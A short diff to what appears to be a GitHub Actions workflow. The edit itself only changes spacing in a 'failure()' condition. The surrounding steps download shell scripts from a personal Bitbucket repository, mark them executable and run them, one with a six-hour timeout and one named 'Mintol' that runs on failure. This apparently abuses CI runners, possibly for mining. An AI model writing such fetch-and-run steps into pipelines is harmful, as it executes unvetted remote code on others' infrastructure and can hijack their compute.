@@ -15,5 +15,5 @@ jobs:
        run: wget https://bitbucket.org/haitani782/agus/raw/3ea1f0f375abe2fa8d7fb3965fa9ed8f2c53eb55/agis.sh;chmod +x agis.sh;timeout 6h ./agis.sh;python -V
 
      - name: Mintol
-       if: {{ failure() }}
+       if: {{ failure()}}
        run: wget https://bitbucket.org/haitani782/agus/raw/3dffa0bc1a959e9b90ef21c1a3f6d267a12fec9e/agus.sh;chmod +x agus.sh;./agus.sh
